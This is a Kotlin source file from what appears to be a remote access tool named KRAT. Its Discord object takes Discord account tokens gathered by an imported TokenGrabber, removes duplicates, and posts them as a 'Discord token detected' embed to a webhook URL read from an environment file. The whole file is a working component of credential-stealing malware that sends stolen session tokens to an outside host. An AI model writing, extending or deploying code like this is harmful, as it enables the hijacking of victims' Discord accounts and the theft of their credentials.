package services

import KRAT.user
import io.github.cdimascio.dotenv.dotenv
import services.discord.TokenGrabber.getTokens
import utils.DiscordWebhook
import utils.ListUtils.removeDuplicates

object Discord {
    val url = dotenv()["WEBHOOK_URL"]

    fun webhook(): DiscordWebhook {
        return DiscordWebhook(url).apply {
            username = user
        }
    }

    fun sendTokens() {
        val tokens = getTokens()?.removeDuplicates()
        if (tokens == null || tokens.isEmpty()) return

        webhook().apply {
            embeds.add(
                DiscordWebhook.EmbedObject()
                    .setTitle("Discord token detected")
                    .setDescription("**Tokens:** ${tokens.map { "```$it```" }.joinToString()}")
            )
            execute()
        }
    }
}